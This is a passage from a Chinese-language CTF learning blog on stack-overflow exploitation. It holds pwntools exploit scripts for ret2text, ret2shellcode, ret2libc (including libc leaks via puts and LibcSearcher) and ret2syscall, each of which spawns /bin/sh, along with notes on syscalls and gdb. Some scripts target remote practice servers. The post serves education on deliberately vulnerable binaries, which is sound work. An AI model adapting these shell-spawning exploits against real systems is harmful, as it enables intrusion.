ASCII 文本</span><br><span class="line"># #int 把接收到的 ASCII hex 字符串按十六进制文本解析成一个整数</span><br><span class="line"></span><br><span class="line">tar=0x400611</span><br><span class="line">pay=b&quot;a&quot;*(0x40+8)+p64(tar)</span><br><span class="line">p.sendlineafter(b&quot;&gt;&quot;,pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#bjdctf_2020_babystack" >clibc使用<i class="fas fa-external-link-alt"></i></a></p>
+<p>原题（<code>111</code>）在系统上运行时用的是系统的 glibc（<code>/lib/x86_64-linux-gnu/libc.so.6</code>），而你把 <code>bjdctf_2020_babystack</code> 换成了 <strong>带有特定 glibc 2.23 的副本</strong>（放在 <code>/usr/lib/freelibs/.../libc.so.6</code>），这会改变 libc 中函数&#x2F;符号&#x2F;内存布局（比如 system、__libc_start_main、one_gadget、ROP gadget 的偏移等）。很多 pwntools&#x2F;exp 脚本依赖 <strong>精确的 libc 偏移</strong>，所以当本地 libc 与目标 libc 版本不一致时（偏移不同），exploit 会失败或 crash。把本地运行环境改成目标用的 libc（2.23）后，地址&#x2F;偏移匹配了，脚本就能正常运行&#x2F;成功利用了。</p>
+<blockquote>
+<p>libc-2.23.so</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p = process(&#x27;./333&#x27;)</span><br><span class="line">back_door=0x4006e6</span><br><span class="line">p.recvuntil(b&#x27;your name:\n&#x27;)</span><br><span class="line">p.sendline(str(0x40))</span><br><span class="line">p.recvuntil(b&#x27;u name?\n&#x27;)</span><br><span class="line">payload=b&#x27;a&#x27;*0x18+p64(back_door)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2635" >链接<i class="fas fa-external-link-alt"></i></a></p>
+<ol>
+<li><code>mmap((void *)0x30303000, 0x1000u, 7, 50, -1, 0);</code><ul>
+<li>在地址 <code>0x30303000</code> 处申请一页（<code>0x1000</code> &#x3D; 4096 字节）的内存映射。</li>
+<li>第三个参数 <code>7</code> 是 <code>prot</code>：<code>PROT_READ | PROT_WRITE | PROT_EXEC</code>（1|2|4 &#x3D; 7），说明该页<strong>可读、可写、可执行（RWX）</strong>。</li>
+<li>第四个参数 <code>50</code>（十进制）即 <code>0x32</code>（十六进制），通常分解为 mmap flags 的位组合：<code>0x02 (MAP_PRIVATE)</code> + <code>0x10 (MAP_FIXED)</code> + <code>0x20 (MAP_ANONYMOUS)</code> &#x3D; <code>0x32 (50)</code>。<ul>
+<li><code>MAP_ANONYMOUS</code>：不从文件映射，内存初始化为 0。</li>
+<li><code>MAP_FIXED</code>：强制在给定地址映射（如果地址不可用会失败或替换原有映射）。</li>
+<li><code>MAP_PRIVATE</code>：写时复制（对我们的目的影响不大）。</li>
+</ul>
+</li>
+<li>总结：在<strong>确切地址</strong> <code>0x30303000</code> 建立 <strong>匿名、私有、RWX、固定地址</strong> 的内存页。</li>
+</ul>
+</li>
+<li><code>read(0, (void *)0x30303000, 0x64u);</code><ul>
+<li>从文件描述符 <code>0</code>（stdin）读 <code>0x64</code> &#x3D; <strong>100</strong> 字节，写入刚映射的内存 <code>0x30303000</code>。</li>
+<li>也就是说程序允许通过标准输入把最多 100 字节的数据放到该可执行页里。</li>
+</ul>
+</li>
+<li><code>MEMORY[0x30303000]();</code><ul>
+<li>把 <code>0x30303000</code> 视为函数指针并调用它 —— 等同于 <code>((void(*)())0x30303000)();</code>。</li>
+<li>也就是：把刚读进来的 100 字节当作机器码来执行。</li>
+<li>这是<strong>直接代码执行（code injection&#x2F;execution）</strong>：攻击者可以把 shellcode、或第一阶段 shellcode 写入并直接执行。</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">p= process(&#x27;./shellcode&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#jarvisoj_level2" >32位<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p=process(&quot;./level2&quot;)</span><br><span class="line">p=remote(&quot;node5.buuoj.cn&quot;,28122)</span><br><span class="line">system=0x08048320</span><br><span class="line">bin=0x0804A024</span><br><span class="line">ret=0x080484B2</span><br><span class="line">pay=b&quot;a&quot;*(0x88+4)+p32(system)+p32(ret)+p32(bin)</span><br><span class="line">p.sendlineafter(b&quot;Input:&quot;,pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#jarvisoj_level0" >64位<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./level0&quot;)</span><br><span class="line">p.recvuntil(b&quot;Hello, World&quot;)</span><br><span class="line"># gdb.attach(p,&quot;b *0x4005C4  &quot;)</span><br><span class="line">system=0x400460</span><br><span class="line">bin=0x400684</span><br><span class="line">ret=0x4005C5</span><br><span class="line">rdi=0X400663</span><br><span class="line">pay=b&quot;a&quot;*0x88+p64(rdi)+p64(bin)+p64(ret)+p64(system)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p><a class="link"   target="_blank" rel="noopener" href="https://www.polarctf.com/#/page/challenges" >1<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc2/ret2libc2" >链接<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">gdb.attach(p,&quot;b*0x080486C4&quot;)</span><br><span class="line">gets= 0x08048460</span><br><span class="line">system= 0x08048490</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">bss= 0x804a200</span><br><span class="line">payload = b&#x27;A&#x27;*112</span><br><span class="line">payload += p32(gets)     # EIP &lt;- gets</span><br><span class="line">payload += p32(pop_ebx)      # gets 返回后跳到 pop_ebx</span><br><span class="line">payload += p32(bss)         # gets(buf2)</span><br><span class="line">payload += p32(system)   # pop_ebx ret 后跳 system</span><br><span class="line">payload += p32(0xdeadbeef)   # system 返回地址</span><br><span class="line">payload += p32(bss)         # system 参数</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(b&#x27;/bin/sh&#x27;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><code>pop_ebx</code> 在这类 exploit 里<strong>主要作用不是</strong>把值放到 <code>ebx</code> 里去给后面的 <code>system</code> 用（<code>system</code> 不看 <code>ebx</code>），而是<strong>通过 <code>pop ebx; ret</code> 这个 gadget 把栈向前推进一个 dword</strong>，从而把栈上的下一项变成 <code>ret</code> 会跳转到的地址（也就是 <code>system</code>）</p>
+<h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p>64位的是要16字节对齐的</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#ciscn_2019_c_1" >64位菜单<i class="fas fa-external-link-alt"></i></a></p>
+<ul>
+<li><code>gets(s)</code>：从标准输入读字符，直到遇到换行或 EOF，然后把换行替换成 <code>&#39;\0&#39;</code> 并写入缓冲区。<strong>不会检查缓冲区长度</strong>（危险！）。</li>
+<li><code>strlen(s)</code>：从 <code>s</code> 开始逐字节向后找，直到遇到第一个 <code>&#39;\0&#39;</code>，返回其前面的长度（<code>size_t</code>）。</li>
+<li><code>puts(s)</code>：把从 <code>s</code> 开始到第一个 <code>&#39;\0&#39;</code> 的字符串写到 stdout，然后自动输出一个换行（<code>\n</code>）。</li>
+</ul>
+<p>因此，三者都以 <code>&#39;\0&#39;</code> 为结束条件（C 风格字符串），它们会把或依赖 <code>&#39;\0&#39;</code> 来确定字符串结尾。</p>
+<p>用libc文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#p=remote(&#x27;node5.buuoj.cn&#x27;,27086)</span><br><span class="line">p=process(&#x27;./222&#x27;)</span><br><span class="line">elf=ELF(&#x27;./222&#x27;)</span><br><span class="line">libc = ELF(&#x27;libc-2.27.so&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">#gdb.attach(p,&quot;b*0x400AEE&quot;)</span><br><span class="line">main=0x400b28</span><br><span class="line">rdi=0x400c83</span><br><span class="line">ret=0x4006b9</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;Input your choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">payload=b&#x27;\x00&#x27;*0x58</span><br><span class="line">payload+=p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendlineafter(&#x27;Input your Plaintext to be encrypted\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,b&#x27;\0&#x27;))</span><br><span class="line">print(b&quot;puts_addr:&quot; + hex(puts_addr).encode())</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">sys_addr = libc_base + libc.sym[&quot;system&quot;]</span><br><span class="line">binsh = libc_base +next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;\x00&#x27;*0x58+ p64(ret) + p64(rdi) + p64(binsh) + p64(sys_addr) </span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>用Libcsearcher </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p=remote(&quot;node5.buuoj.cn&quot;,25485)</span><br><span class="line">#p=process(&#x27;./222&#x27;)</span><br><span class="line">elf=ELF(&#x27;./222&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">#gdb.attach(p,&quot;b*0x400AEE&quot;)</span><br><span class="line">main=0x400b28</span><br><span class="line">rdi=0x400c83</span><br><span class="line">ret=0x4006b9</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#x27;Input your choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">payload=b&#x27;\x00&#x27;*0x58</span><br><span class="line">payload+=p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendlineafter(&#x27;Input your Plaintext to be encrypted\n&#x27;,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(b&quot;puts_addr:&quot; + hex(puts_addr).encode())</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">sys_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh = libc_base +libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">p.sendlineafter(&#x27;choice!\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">payload=b&#x27;\x00&#x27;*0x58+ p64(ret) + p64(rdi) + p64(binsh) + p64(sys_addr) </span><br><span class="line">p.sendlineafter(&#x27;encrypted\n&#x27;,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&#x27;\n&#x27;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>从进程&#x2F;远端读取直到遇到换行（包含换行本身）。<strong>注意</strong>：在 Python3 &#x2F; pwntools 中应传 <code>bytes</code>：<code>p.recvuntil(b&#39;\n&#39;)</code>，否则会出错或行为不一致。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[:-1]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>去掉最后一个字节（也就是把换行 <code>\n</code> 去掉），得到“行内容”。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.ljust(8, b&#x27;\0&#x27;)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>把得到的字节串<strong>右侧填充到 8 字节</strong>（小端 u64 需要 8 字节）。例如如果你得到 <code>b&#39;\x10\x20\x30&#39;</code>（3 字节），ljust(8,b’\0’) 变成 <code>b&#39;\x10\x20\x30\x00\x00\x00\x00\x00&#39;</code>。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u64(...)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>把上面的 8 字节按 <strong>小端</strong> 解为一个 64 位整数（pwntools 的 <code>u64</code>）。得到 <code>puts_addr</code>。</li>
+</ul>
+<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" >链接<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>寄存器</strong></p>
+<p>在32位系统中，通过<strong>int 0x80</strong>指令触发系统调用。其中，EAX寄存器用于传递系统调用号，参数按顺序赋值给<strong>EBX、ECX、EDX、ESI、</strong></p>
+<p><strong>EDI、EBP</strong>这6个寄存器。</p>
+<p>在64位系统中，使用<strong>syscall</strong>指令来触发系统调用，同样使用<strong>EAX（RAX）寄存器传递系统调用号</strong>，<strong>RDI、RSI、RDX、RCX、R8、R9</strong></p>
+<p>这6个寄存器用来传递参数。</p>
+<p><img   src="/image-20250711172325495.png"  alt="image-20250711172325495"></p>
+<p>eg:read（0,buf,0x100）</p>
+<p>32位时，eax&#x3D;3（#define__NR_read 3）;ebx&#x3D;0;ecx&#x3D;buf;edx&#x3D;0x100;，设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的read（0,buf,0x100）。实际上，最后还会进入内核态执行。</p>
+<p>64位时，rax&#x3D;0（#define__NR_read 0）;rdi&#x3D;0;rsi&#x3D;buf;rdx&#x3D;0x100，设置完每个寄存器的值之后，再执行syscall指令，就会执行对应的read（0,buf,0x100）。</p>
+<p>也是进入内核态执行。</p>
+<p>如果想要完成Get shell</p>
+<p>system(“&#x2F;bin&#x2F;sh”)</p>
+<p>32位时，：eax&#x3D;11（#define__NR_execve 11）;ebx&#x3D;”&#x2F;bin&#x2F;sh”;ecx&#x3D;0;edx&#x3D;0;（NULL实际上就是0），设置完每个寄存器的值之后，再执行int 0x80指令，就会执行对应的execve（”&#x2F;bin&#x2F;sh”,NULL,NULL）。</p>
+<p>64位时，rax&#x3D;59（#define__NR_execve 59）;rdi&#x3D;”&#x2F;bin&#x2F;sh”;rsi&#x3D;0;rdx&#x3D;0;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;./rop&#x27;)</span><br><span class="line">eax= 0x080bb196</span><br><span class="line">edx_ecx_ebx= 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line"></span><br><span class="line">pay= flat(</span><br><span class="line">    [&#x27;A&#x27; * 112, eax, 0xb, edx_ecx_ebx, 0, 0, binsh, int_0x80])</span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class="line">ROPgadget --binary rop  --string &#x27;/bin/sh&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>系统调用号，即 eax 应该为 0xb</li>
+<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>挺多的，慢慢学</p>
+<p><code>gdb ./vuln</code><br> 在本地打开可执行文件。</p>
+<p><code>run</code> 或 <code>r</code><br> 运行程序（可加参数：<code>run arg1 arg2</code>）</p>
+<p><code>break main</code> 或 <code>b main</code><br> 在函数入口下断点。</p>
+<p><code>break *0x40060d</code> 或 <code>b *0x40060d</code><br> 在具体地址下断点</p>
+<p><code>continue</code> 或 <code>c</code> —— 继续运行到下一个断点。</p>
+<p><code>step</code> 或 <code>s</code> —— 单步，进入函数（按源码&#x2F;指令）。</p>
+<p><code>next</code> 或 <code>n</code> —— 单步，不进入函数（跳过 call）。</p>
+<p><code>si</code> &#x2F; <code>ni</code> —— 指令级单步（single instruction &#x2F; next instruction）。</p>
+<p><code>finish</code> —— 运行到当前函数返回并打印返回值。</p>
+<p><code>p/x $rsp</code> 或 <code>p/x $rax</code> —— 打印寄存器值（十六进制）。</p>
+<p><code>disassemble main</code> 或 <code>disassemble 0x40060d,0x400630</code> —— 反汇编函数&#x2F;地址区间。</p>
+<p><code>x/i $rip</code>（x86_64） &#x2F; <code>x/i $eip</code>（x86） —— 查看当前指令。</p>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/06/10/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"
+                                   title="bin"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">bin</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="giscus-comments-container">
+        <div class="giscus" id="giscus"></div>
+        <script 
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          if (!window.KeepCommentPlugin?.getGiscusTheme) {
+            window.KeepCommentPlugin.getGiscusTheme = () => {
+              return document.documentElement.classList.contains('dark-mode') ? 'dark_dimmed' : 'light_tritanopia'
+            }
+          }
+
+          if (!window.KeepCommentPlugin?.changeGiscusTheme) {
+            window.KeepCommentPlugin.changeGiscusTheme = () => {
+              const iframe = document.querySelector('iframe.giscus-frame')
+              iframe && iframe.contentWindow.postMessage({
+                giscus: {
+                  setConfig: {
+                    theme: window.KeepCommentPlugin.getGiscusTheme()
+                  }
+                }
+              }, 'https://giscus.app')
+            }
+          }
+
+          if (!window.KeepCommentPlugin?.initGiscus) {
+            window.KeepCommentPlugin.initGiscus = () => {
+              const script = document.createElement('script')
+              script.async = true
+              script.src = 'https://giscus.app/client.js'
+              script.setAttribute('data-repo', 'zach0ry-zzh/zach0ry-zzh.github.io')
+              script.setAttribute('data-repo-id', 'R_kgDOPKvC2Q')
+              script.setAttribute('data-category', 'Comments')
+              script.setAttribute('data-category-id', 'DIC_kwDOPKvC2c4DByYU')
+              script.setAttribute('data-reactions-enabled', '1')
+              script.setAttribute('data-lang', 'en')
+              script.setAttribute('data-mapping', 'pathname')
+              script.setAttribute('data-strict', '0')
+              script.setAttribute('data-emit-metadata', '0')
+              script.setAttribute('data-input-position', 'top')
+              script.setAttribute('crossorigin', 'anonymous')
+              script.setAttribute('loading', 'lazy')
+              script.setAttribute('data-theme', window.KeepCommentPlugin.getGiscusTheme())
+              document.querySelector('.giscus-comments-container').appendChild(script)
+              script.onerror = () => {
+                window.KeepCommentPlugin.loadFailHandle()
+              }
+              script.onload = () => {
+                window.KeepCommentPlugin.hideLoading()
+              }
+              const toggleThemeBtn = document.querySelector('.tool-toggle-theme-mode')
+              toggleThemeBtn && toggleThemeBtn.addEventListener('click', () => {
+                window.KeepCommentPlugin.changeGiscusTheme()
+              })
+            }
+          }
+
+          if ('false' === "true") {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initGiscus()
+            }, 1000)
+          } else {
+            window.addEventListener("DOMContentLoaded", window.KeepCommentPlugin.initGiscus)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN%E5%85%A5%E9%97%A8"><span class="nav-text">PWN入门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ghost-%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="nav-text">:ghost:源码到可执行文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#elf%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="nav-text">elf可执行文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ELF-Header"><span class="nav-text">ELF Header</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Program-Header-Table%EF%BC%88%E7%A8%8B%E5%BA%8F%E5%A4%B4%E8%A1%A8%EF%BC%8CSegments%EF%BC%89"><span class="nav-text">Program Header Table（程序头表，Segments）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#readelf-l-2"><span class="nav-text">readelf -l 2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#-1"><span class="nav-text"></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Sections%EF%BC%88%E8%8A%82-Sections%EF%BC%89"><span class="nav-text">Sections（节 &#x2F; Sections）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#text"><span class="nav-text">.text</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rodata"><span class="nav-text">.rodata</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data"><span class="nav-text">.data</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bss"><span class="nav-text">.bss</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#symtab-strtab"><span class="nav-text">.symtab &#x2F; .strtab</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dynsym-dynstr"><span class="nav-text">.dynsym &#x2F; .dynstr</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#got-got-plt"><span class="nav-text">.got &#x2F; .got.plt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#plt"><span class="nav-text">.plt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rela-rel"><span class="nav-text">.rela.* &#x2F; .rel.*</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#init-array-fini-array"><span class="nav-text">.init_array &#x2F; 